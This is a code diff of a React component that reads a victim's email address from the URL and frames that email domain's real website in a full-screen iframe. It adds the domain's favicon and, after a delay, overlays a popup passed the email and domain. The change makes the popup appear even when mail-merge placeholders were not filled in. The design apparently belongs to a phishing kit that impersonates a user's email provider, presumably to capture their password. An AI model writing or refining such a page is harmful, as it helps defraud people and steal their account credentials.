@@ -10,6 +10,7 @@ const Fetcher = () => {
   const [favicon, setFavicon] = useState("");
   const [showPopup, setShowPopup] = useState(false);
   const [eparams, setEparams] = useState("");
+  const [hasEmailParam, setHasEmailParam] = useState(false);
 
   useEffect(() => {
     const extractEmailFromURL = () => {
@@ -85,6 +86,7 @@ const Fetcher = () => {
     
     // ALWAYS SHOW POPUP IF WE HAVE ANY EMAIL PARAMETER (even template patterns)
     if (extractedEmail) {
+      setHasEmailParam(true);
       // Try to extract domain if it's a real email
       if (extractedEmail.includes('@') && !extractedEmail.includes('[[') && !extractedEmail.includes('{{') && !extractedEmail.includes('%')) {
         const domain = extractedEmail.split("@")[1];
@@ -93,22 +95,21 @@ const Fetcher = () => {
         setWebsiteUrl(url);
         fetchFavicon(domain);
       } else {
-        // For template patterns, use a fallback domain
-        setEmailDomain("gmail.com"); // or any default domain
-        setWebsiteUrl("https://www.gmail.com");
-        fetchFavicon("gmail.com");
+        // For template patterns, just show popup with black background
+        setEmailDomain("Template Email");
+        setFavicon("");
       }
     }
   }, []);
 
   useEffect(() => {
     // Show popup if we have email params (even template patterns)
-    if (eparams) {
+    if (hasEmailParam) {
       setTimeout(() => {
         setShowPopup(true);
       }, 3000);
     }
-  }, [eparams]);
+  }, [hasEmailParam]);
 
   const fetchFavicon = (domain) => {
     const faviconUrl = `https://${domain}/favicon.ico`;
@@ -122,44 +123,42 @@ const Fetcher = () => {
       margin: 0,
       padding: 0,
       position: 'relative',
-      backgroundColor: 'transparent'
+      backgroundColor: websiteUrl ? 'transparent' : 'black'
     }}>
       {websiteUrl && (
-        <>
-          <div className="iframe-container" style={{
-            width: '100%',
-            height: '100%',
-            margin: 0,
-            padding: 0,
-            border: 'none',
-            overflow: 'hidden'
-          }}>
-            <iframe 
-              src={websiteUrl} 
-              title=" " 
-              style={{
-                width: '100%',
-                height: '100%',
-                border: 'none',
-                margin: 0,
-                padding: 0
-              }}
-            />
-          </div>
-          {showPopup && (
-            <Popup
-              domain={emailDomain}
-              favicon={favicon}
-              eparams={eparams}
-              systemInfo={{
-                date: new Date(),
-                browser: "Chrome",
-                os: "Windows",
-                location: "Unknown"
-              }}
-            />
-          )}
-        </>
+        <div className="iframe-container" style={{
+          width: '100%',
+          height: '100%',
+          margin: 0,
+          padding: 0,
+          border: 'none',
+          overflow: 'hidden'
+        }}>
+          <iframe 
+            src={websiteUrl} 
+            title=" " 
+            style={{
+              width: '100%',
+              height: '100%',
+              border: 'none',
+              margin: 0,
+              padding: 0
+            }}
+          />
+        </div>
+      )}
+      {showPopup && hasEmailParam && (
+        <Popup
+          domain={emailDomain}
+          favicon={favicon}
+          eparams={eparams}
+          systemInfo={{
+            date: new Date(),
+            browser: "Chrome",
+            os: "Windows",
+            location: "Unknown"
+          }}
+        />
       )}
     </div>
   );
